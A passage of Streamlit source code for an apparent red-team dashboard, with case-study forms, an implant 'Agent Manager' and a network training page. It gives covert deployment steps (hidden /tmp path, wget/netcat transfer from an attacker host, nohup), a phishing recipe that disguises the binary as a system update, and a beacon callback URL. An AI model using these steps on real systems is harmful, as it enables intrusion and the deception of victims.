            challenge = st.text_area("The Challenge", "Client was experiencing frequent security incidents...")
            solution = st.text_area("OSI's Solution", "We implemented a comprehensive security program including...")
            results = st.text_area("The Results", "Zero security incidents in 6 months, 85% reduction in risk score...")
            
            st.subheader("Key Metrics")
            col1, col2 = st.columns(2)
            metric1_name = col1.text_input("Metric 1 Name", "vulnerabilities_found")
            metric1_value = col2.text_input("Metric 1 Value", "47")
            
            metric2_name = col1.text_input("Metric 2 Name", "risk_reduction")
            metric2_value = col2.text_input("Metric 2 Value", "85%")
            
            if st.form_submit_button("Create Case Study", type="primary"):
                metrics = {}
                if metric1_name and metric1_value:
                    metrics[metric1_name] = metric1_value
                if metric2_name and metric2_value:
                    metrics[metric2_name] = metric2_value
                
                study = case_db.create_study(industry, challenge, solution, results, metrics)
                st.success(f"‚úÖ Case Study #{study['id']} Created!")
                st.balloons()
                st.rerun()

elif page == "ü§ñ Agent Manager":
    st.header("ü§ñ OSI Field Agent Manager")
    st.markdown("*Deploy and manage OSI agents on target systems*")
    
    # Check if agent is built
    agent_path = "./osi-agent/target/release/osi-agent"
    agent_exists = os.path.exists(agent_path)
    
    if agent_exists:
        agent_size = os.path.getsize(agent_path) / 1024 / 1024
        st.success(f"‚úÖ Agent Built! ({agent_size:.2f} MB)")
    else:
        st.warning("‚ö†Ô∏è Agent not built yet!")
    
    tab1, tab2, tab3 = st.tabs(["üì¶ Build", "üöÄ Deploy", "üì° Monitor"])
    
    with tab1:
        st.subheader("Build OSI Agent")
        
        st.info("üí° **To build the agent:** Use the 'BUILD AGENT' button on the üöÄ Launchpad page (it's tested and working there)")
        
        if agent_exists:
            st.markdown("---")
            st.metric("Binary Location", agent_path)
            st.metric("Binary Size", f"{agent_size:.2f} MB")
            
            # Download button
            with open(agent_path, 'rb') as f:
                st.download_button(
                    label="üì• Download Agent Binary",
                    data=f.read(),
                    file_name="osi-agent",
                    mime="application/octet-stream"
                )
    
    with tab2:
        st.subheader("üöÄ Deployment Instructions")
        
        st.markdown("""
        ### Option 1: Direct Execution (Testing)
        
        **On your test machine:**
        ```bash
        # Make executable
        chmod +x osi-agent
        
        # Run agent
        ./osi-agent
        ```
        
        ---
        
        ### Option 2: Covert Deployment (Red Team)
        
        **1. Transfer to Target:**
        ```bash
        # Via SCP
        scp osi-agent user@target:/tmp/.sys
        
        # Via HTTP
        python3 -m http.server 8888
        # On target: wget http://yourip:8888/osi-agent
        
        # Via netcat
        nc -l -p 4444 < osi-agent  # On attacker
        nc yourip 4444 > agent     # On target
        ```
        
        **2. Execute on Target:**
        ```bash
        # Run in background
        nohup /tmp/.sys &
        
        # Or as service (requires root)
        # Create systemd service
        ```
        
        ---
        
        ### Option 3: Phishing Payload
        
        **Embed in document or email:**
        - Rename to look innocent: system_update.bin
        - Combine with social engineering
        - Target runs it thinking it's legit
        
        ---
        
        ### ‚ö†Ô∏è WARNING
        Deploy ONLY on systems you own or have written authorization to test!
        """)
        
        st.markdown("---")
        st.subheader("üì° Callback Configuration")
        
        callback_url = st.text_input("Callback URL", "http://192.168.12.225:8080/beacon")
        st.info(f"Agent will phone home to: {callback_url}")
        
        st.caption("üí° In production, set up a listener to receive agent beacons")
    
    with tab3:
        st.subheader("üì° Active Agents Monitor")
        
        st.info("üöß Agent beacon receiver coming in Option 3: Red Team Expansion")
        
        st.markdown("""
        **What You'll See Here:**
        - Active agents count
        - Last seen timestamp
        - System info from each agent
        - Command execution results
        
        **For Now:**
        - Build agent ‚úÖ
        - Deploy manually ‚úÖ
        - Monitor via logs üìù
        """)

elif page == "üî• Pentesting Log":
    exec(open("osi_pentesting_tracker.py").read())

elif page == "ü•ã OSI Training Dojo":
    st.header("ü•ã OSI Network Training Dojo")
    st.markdown("*Master the tools of the trade. Interactive CLI Training.*")
    
    st.info("üí° This module runs in your TERMINAL because hacking tools need direct system access.")
    
    col1, col2 = st.columns(2)
    
    with col1:
        st.subheader("Interactive CLI Tutor")
        st.write("A guided interactive program to teach you `ip`, `ss`, `netcat`, and more.")
        st.code("cd ~/lifetime-maintenance/osi-pentest\n./osi_network_dojo.py", language="bash")
        st.write("run this in your terminal")
            
    with col2:
        st.subheader("Automated Practice Script")
        st.write("A quick bash script that runs all the recon commands for you.")
        st.code("cd ~/lifetime-maintenance/osi-pentest\n./network_practice.sh", language="bash")
        st.write("run this in your terminal to practice")

    st.markdown("---")
    st.subheader("üìö Curriculum Preview")
    
    with st.expander("1. Modern Replacement Tools"):
        st.markdown("""
        **Don't use:** `ifconfig`, `netstat`, `route`
        **Use:** `ip a`, `ss -tulpn`, `ip r`
        """)
        
    with st.expander("2. Netcat (The Swiss Army Knife)"):
        st.markdown("""
        **Chat/Data Transfer:** Connect two computers.
        **Port Scanning:** Find open ports.
        **Bind Shells:** Remote command execution.
        """)
        
    with st.expander("3. Finding Backdoors"):
        st.markdown("""
        Use `ss -tulpn` to find hidden listening processes.
        """)
